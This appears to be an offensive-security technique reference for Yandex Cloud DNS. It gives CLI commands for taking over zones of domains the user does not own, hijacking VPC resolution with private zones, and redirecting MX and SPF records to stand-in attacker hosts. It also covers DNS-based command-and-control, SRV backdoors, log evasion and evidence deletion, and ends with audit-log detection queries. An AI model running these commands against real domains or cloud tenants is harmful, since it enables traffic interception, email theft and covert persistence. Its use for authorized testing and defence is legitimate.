# Yandex Cloud - Cloud DNS Techniques

## Service Overview

Yandex Cloud DNS manages DNS zones and resource records. It supports **public zones** (internet-resolvable), **private zones** (VPC-internal resolution), and **service zones** (auto-created for internal FQDNs). The service does NOT require domain ownership verification for public zones — anyone can create a zone for any domain name. Private zones override public resolution within their associated VPC networks.

**Key Concepts:**
- **Public Zones**: Internet-accessible; require NS delegation to `ns1.yandexcloud.net` / `ns2.yandexcloud.net`
- **Private Zones**: Only visible within specified VPC networks; override public DNS for those networks
- **Service Zones**: Auto-created per VPC (`.internal.`, reverse zones); contain VM FQDNs and MDB names
- **No Domain Ownership Verification**: Public zones can be created for domains you don't own
- **No DNSSEC**: The service does not support DNSSEC
- **SOA SERIAL Not Auto-Incremented**: Changing records does not update `SERIAL` — stale caches persist unless manually bumped
- **Record Types**: A, AAAA, CAA, CNAME, ANAME, MX, NS, PTR, SOA, SRV, SVCB, HTTPS, TXT

---

## Enumeration

### Enumerate DNS Zones

```bash
# List all DNS zones in the folder
yc dns zone list

# Get zone details (type, visibility, networks)
yc dns zone get <zone_name_or_id>

# Get zone in JSON for parsing
yc dns zone get <zone_name> --format json | \
  jq '{name: .name, zone: .zone, public: .public_visibility, private: .private_visibility}'
```

### Enumerate Resource Records

```bash
# List all records in a zone
yc dns zone list-records <zone_name_or_id>

# List records with specific format
yc dns zone list-records <zone_name> --format json
```

### Enumerate Zone Access Bindings

```bash
# Who has access to this zone?
yc dns zone list-access-bindings <zone_name_or_id>
```

### Identify Private Zone Network Associations

```bash
# Check which VPC networks a private zone is associated with
yc dns zone get <zone_name> --format json | \
  jq '.private_visibility.network_ids'
```

### Discover Service Zones

Service zones are auto-created per VPC and contain internal FQDNs:
- `.internal.` — VM hostnames
- Reverse zones (`10.in-addr.arpa.`, `168.192.in-addr.arpa.`, etc.)
- Contains auto-generated records for VMs and managed database clusters

```bash
# List all zones (includes service zones)
yc dns zone list --format json | \
  jq '.[] | select(.zone == "internal." or (.zone | test("in-addr.arpa")))'
```

---

## DNS Zone Takeover

### Public Zone Takeover (No Domain Verification)

Yandex Cloud DNS does **not** verify domain ownership when creating public zones. If a domain owner delegates their domain to Yandex Cloud nameservers (`ns1.yandexcloud.net`, `ns2.yandexcloud.net`) but hasn't created the corresponding zone in Cloud DNS, an attacker can claim it:

```bash
# Create a public zone for a domain you don't own
yc dns zone create --name hijacked-zone \
  --zone "target-company.com." \
  --public-visibility

# Add records to serve attacker-controlled content
yc dns zone add-records hijacked-zone \
  --record "target-company.com. 300 A 203.0.113.66"

yc dns zone add-records hijacked-zone \
  --record "www.target-company.com. 300 A 203.0.113.66"

# Add MX records to intercept email
yc dns zone add-records hijacked-zone \
  --record "target-company.com. 300 MX 10 mail.attacker.com."
```

**Impact**: Full DNS control over the domain — web traffic interception, email hijacking, TLS certificate issuance (via DNS-01 challenge).

### Subdomain Takeover

If a CNAME record points to a Yandex Cloud resource that no longer exists (deleted VM, removed S3 bucket), an attacker can provision a new resource at that endpoint:

```bash
# Enumerate CNAME records pointing to yandexcloud.net resources
yc dns zone list-records <zone_name> --format json | \
  jq '.[] | select(.type == "CNAME") | select(.data[] | test("yandexcloud|storage.yandexcloud"))'
```

---

## Private Zone DNS Hijacking

### Override Public DNS Resolution in a VPC

Private zones **override** public zones within their associated VPC networks. An attacker with `dns.editor` can redirect all traffic for any domain within a VPC:

```bash
# Create a private zone that overrides a public domain
yc dns zone create --name internal-hijack \
  --zone "legitimate-service.com." \
  --private-visibility \
  --network-ids <target_vpc_network_id>

# Point the domain to an attacker-controlled IP
yc dns zone add-records internal-hijack \
  --record "legitimate-service.com. 60 A 10.0.0.99"

yc dns zone add-records internal-hijack \
  --record "*.legitimate-service.com. 60 A 10.0.0.99"
```

**Impact**: All VMs in the target VPC will resolve `legitimate-service.com` to the attacker's IP. This enables credential harvesting, MitM attacks, and data exfiltration.

### Hijack Internal Service Discovery

Override service zones to redirect internal VM-to-VM or VM-to-database traffic:

```bash
# Create a private zone overlapping the internal zone
yc dns zone create --name hijack-internal \
  --zone "internal." \
  --private-visibility \
  --network-ids <target_vpc_network_id>

# Redirect specific internal hostnames to attacker VM
yc dns zone add-records hijack-internal \
  --record "db-server.internal. 60 A 10.0.0.99"
```

---

## Record Manipulation

### Modify Existing DNS Records

```bash
# Replace an existing A record (redirect traffic)
yc dns zone replace-records <zone_name> \
  --record "app.example.com. 300 A 203.0.113.66"

# Add additional A records (load balance to include attacker)
yc dns zone add-records <zone_name> \
  --record "api.example.com. 300 A 203.0.113.66"
```

### Weaken Email Security

```bash
# Replace SPF record to allow attacker's mail server
yc dns zone replace-records <zone_name> \
  --record 'example.com. 300 TXT "v=spf1 ip4:203.0.113.0/24 include:attacker.com ~all"'

# Remove or weaken DMARC policy
yc dns zone replace-records <zone_name> \
  --record '_dmarc.example.com. 300 TXT "v=DMARC1; p=none;"'

# Modify MX records to intercept email
yc dns zone replace-records <zone_name> \
  --record "example.com. 300 MX 1 mail.attacker.com."
```

### Weaken Certificate Authority Authorization

```bash
# Remove CAA restrictions to allow any CA to issue certificates
yc dns zone delete-records <zone_name> \
  --record 'example.com. 600 CAA "128 issue \"ca.example.net\""'

# Or add permissive CAA record for attacker-controlled CA
yc dns zone add-records <zone_name> \
  --record 'example.com. 300 CAA "0 issue \"letsencrypt.org\""'
```

---

## Persistence

### Establish Persistent DNS-Based C2

```bash
# Add TXT records for C2 data exfiltration/commands
yc dns zone add-records <zone_name> \
  --record "cmd.example.com. 60 TXT \"base64_encoded_command_here\""

# Low TTL ensures fresh commands on each query
yc dns zone replace-records <zone_name> \
  --record "beacon.example.com. 60 A 203.0.113.66"
```

### Create Backup Access via DNS

```bash
# Add SRV records pointing to attacker infrastructure
yc dns zone add-records <zone_name> \
  --record "_ssh._tcp.example.com. 300 SRV 10 10 2222 backdoor.attacker.com."
```

---

## SOA SERIAL Cache Exploitation

Yandex Cloud DNS does **not** auto-increment the SOA `SERIAL` field when records change. External DNS servers caching the zone will not detect changes until the SERIAL is manually updated or caches expire:

```bash
# After modifying records, the SOA SERIAL remains unchanged
# External resolvers won't re-fetch records even though they changed
# This creates a window where:
# - Internal Yandex Cloud resolution returns new (attacker) records
# - External resolvers still return old (legitimate) records
# - Dual behavior makes detection harder

# To exploit: modify records but DON'T update SERIAL
# Attacker gets internal hijacking while external monitoring sees no change
```

To force cache refresh (if you want changes to propagate):
```bash
# Manually increment SERIAL to force external cache refresh
yc dns zone update <zone_name> \
  --soa-serial <new_higher_value>
```

---

## Lateral Movement

### Pivot via Private Zone Associations

Private zones can be associated with multiple VPC networks. Adding new network associations extends DNS hijacking to additional networks:

```bash
# Extend a malicious private zone to cover additional VPCs
yc dns zone update-private-networks --add-network-ids <additional_network_id> \
  --id <zone_id>
```

### Move Zones Between Folders

```bash
# Move a zone to a folder with weaker access controls
yc dns zone move <zone_id> --destination-folder-id <target_folder_id>
```

---

## Defense Evasion

### Low TTL Record Swapping

```bash
# Set very low TTL, swap records in and out quickly
yc dns zone replace-records <zone_name> \
  --record "target.example.com. 30 A 203.0.113.66"

# After attack, restore original record
yc dns zone replace-records <zone_name> \
  --record "target.example.com. 3600 A 192.0.2.1"
```

### Exploit Logging Gaps

- **DNS queries are NOT logged** in Audit Trails — only zone/record management operations
- Data events for DNS (when enabled) cover zone and record modifications, not query traffic
- No query logging means DNS tunneling/exfiltration is invisible to Cloud DNS auditing

### Delete Evidence

```bash
# Delete the malicious zone entirely
yc dns zone delete <zone_name>
```

---

## Key IAM Roles

| Role | Capabilities |
|---|---|
| `dns.auditor` | View zone metadata and access bindings (no record access) |
| `dns.viewer` | View zones AND resource records |
| `dns.editor` | Create/modify/delete zones and records; requires `vpc.user` for private zones |
| `dns.admin` | Full control including access binding management |

**Critical Note**: `dns.editor` enables zone creation for ANY domain (public) and DNS hijacking within ANY associated VPC (private). Combined with `vpc.user`, this is sufficient for full DNS takeover.

---

## Detection and Logging

### Audit Trail Events (`event_source: dns`)

**Management Events** (logged by default):
- `CreateDnsZone` / `DeleteDnsZone` / `UpdateDnsZone` — zone lifecycle
- `UpsertRecordSets` — record creation/modification
- `UpdateAccessBindings` / `SetAccessBindings` — permission changes
- `MoveDnsZone` — zone folder transfers

**Data Events** (must be explicitly enabled):
- `GetDnsZone` — zone reads
- `ListDnsZones` — zone enumeration
- `ListRecordSets` — record enumeration

### Detection Queries

**Detect public zone creation for suspicious domains**:
```
event_type = "yandex.cloud.audit.dns.CreateDnsZone"
AND details.public_visibility IS NOT NULL
```

**Detect private zone creation (potential DNS hijacking)**:
```
event_type = "yandex.cloud.audit.dns.CreateDnsZone"
AND details.private_visibility IS NOT NULL
```

**Detect record modifications**:
```
event_type = "yandex.cloud.audit.dns.UpsertRecordSets"
```

**Detect zone deletion (evidence destruction)**:
```
event_type = "yandex.cloud.audit.dns.DeleteDnsZone"
```

### What Is NOT Logged
- DNS query traffic (which domains are being resolved)
- DNS resolution results (what IPs are returned)
- DNS tunneling activity
- Which VMs are querying which records

---

## References

- DNS Zone Concepts: `en/dns/concepts/dns-zone.md`
- Resource Records: `en/dns/concepts/resource-record.md`
- Access Management: `en/dns/security/index.md`
- CLI Reference: `en/cli/cli-ref/dns/cli-ref/zone/`
- Quotas and Limits: `en/dns/concepts/limits.md`
